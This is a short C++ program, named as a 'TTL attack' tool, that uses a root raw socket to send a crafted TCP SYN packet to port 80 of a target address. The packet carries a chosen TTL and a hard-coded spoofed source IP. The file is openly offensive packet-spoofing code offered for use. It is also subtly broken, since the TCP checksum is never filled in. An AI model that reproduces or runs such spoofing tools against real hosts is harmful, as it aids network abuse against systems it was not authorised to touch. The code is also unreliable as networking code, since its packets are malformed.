// Compile: g++ -o ttl_attack ttl_attack.cpp
// Run: sudo ./ttl_attack <target_ip> <ttl_value>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

class TTLAttack {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    TTLAttack() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    void send(const char* targetIP, int ttl) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        memset(packet, 0, 4096);
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->ttl = ttl;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr("192.168.1.100");
        ip->daddr = target.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(80);
        tcp->seq = rand();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        
        sendto(sock, packet, ip->tot_len, 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
    
    ~TTLAttack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <ttl>\n";
        return 1;
    }
    TTLAttack attack;
    attack.send(argv[1], atoi(argv[2]));
    return 0;
}